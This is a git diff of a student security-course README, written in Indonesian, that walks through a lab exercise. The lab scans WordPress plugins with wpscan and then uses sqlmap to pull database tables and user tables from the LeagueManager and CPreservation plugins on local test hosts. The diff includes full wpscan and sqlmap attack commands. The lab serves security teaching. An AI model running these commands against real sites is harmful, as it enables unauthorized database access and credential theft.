@@ -81,7 +81,7 @@ Dimas Hirda P | 5114100147
     ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/add4.png)
  4. Pilih activate plugin
  
-### Sql injection dengan wpscan
+### SQLAnalisis dengan wpscan
 1. memindai vulnerabilities dari plugin yang telah diinstall menggunakan wpscan
   ```bash
   wpscan -u 192.168.1.15/wordpress --enumerate vp
@@ -90,3 +90,41 @@ Dimas Hirda P | 5114100147
 2. tunggu hingga proses pemindaian vulnerabilities wpscan selesai
    ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/wpscan2.png)
  
+### SQLInjection dengan sqlmap
+1. Menggunakan Sql Map untuk melakukan sql injection terhadap leaguemanager untuk menggambil semua tables yang ada.
+
+```bash
+sqlmap -u "http://10.151.36.5/html/2016/10/12/match/?match=1" --dbms mysql --level 5 --risk 3 --tables
+```
+  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/sqlmap1.png)
+
+Hasil Uji dengan sqlmap dengan command:
+
+ ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/sqlmap2.png)
+ ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/sqlmap3.png)
+ ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/sqlmap4.png)
+ 
+2. Menggunakan Sql Map untuk mengambil tabel user leaguemanager
+
+ ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/sqlmap4.5.png)
+ 
+ hasilnya:
+ ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/sqlmap5.png)
+ 
+3. Menggunakan Sql Map untuk melakukan sql injection terhadap CPreservation.
+
+Lakukan perintah seperti dibawah
+![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/reservation0.png)
+
+Maka, terlihat parameter yang vulnerable
+
+![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/reservation.png)
+
+4. Menggunakan Sql Map untuk mengambil tabel user CPreservation
+
+Lakukan perintah seperti dibawah
+![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/reservation1.png)
+
+ 
+ hasilnya:
+ ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/reservation2.png)
